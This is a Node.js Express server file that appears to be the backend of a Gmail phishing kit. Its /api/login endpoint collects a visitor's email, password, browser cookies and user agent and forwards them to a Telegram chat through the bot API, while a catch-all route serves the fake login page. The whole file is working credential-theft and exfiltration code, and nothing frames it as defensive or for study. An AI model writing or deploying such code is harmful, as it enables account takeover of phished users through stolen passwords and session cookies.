const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─── Environment variables ────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. Telegram notifications will be disabled.');
}

// ─── POST /api/login ──────────────────────────────────────────────────
app.post('/api/login', async (req, res) => {
    const { email, password, cookies, userAgent, timestamp, pageUrl } = req.body;

    // Build a readable Telegram message (Markdown format)
    const message = `
📩 **New Gmail Credentials**
👤 **Email:** ${email}
🔑 **Password:** ${password}
🍪 **Cookies:** ${cookies || '(none)'}
🖥️ **User‑Agent:** ${userAgent}
⏱️ **Time:** ${timestamp}
🔗 **Page:** ${pageUrl}
    `;

    // Send to Telegram
    let telegramResult = 'not attempted';
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        try {
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const resp = await axios.post(telegramUrl, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            telegramResult = 'success';
        } catch (err) {
            console.error('Telegram error:', err.message);
            telegramResult = 'failed: ' + err.message;
        }
    } else {
        telegramResult = 'not configured';
    }

    res.json({ status: 'delivered', telegram: telegramResult });
});

// ─── Serve the HTML for any other route ──────────────────────────────
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});